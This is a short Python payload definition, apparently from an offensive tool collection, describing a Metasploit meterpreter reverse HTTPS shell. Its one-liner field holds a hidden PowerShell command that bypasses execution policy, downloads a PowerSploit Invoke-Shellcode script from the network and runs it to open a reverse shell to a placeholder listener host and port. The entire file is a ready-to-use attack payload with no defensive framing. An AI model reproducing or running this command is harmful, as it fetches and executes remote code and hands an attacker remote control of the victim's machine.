class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Metasploit meterpreter reverse HTTPS shell using a powershell script from powersploit"
    function    = "reverse shell"
    liner     = """Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost TARGET -Lport PORT -Force"""
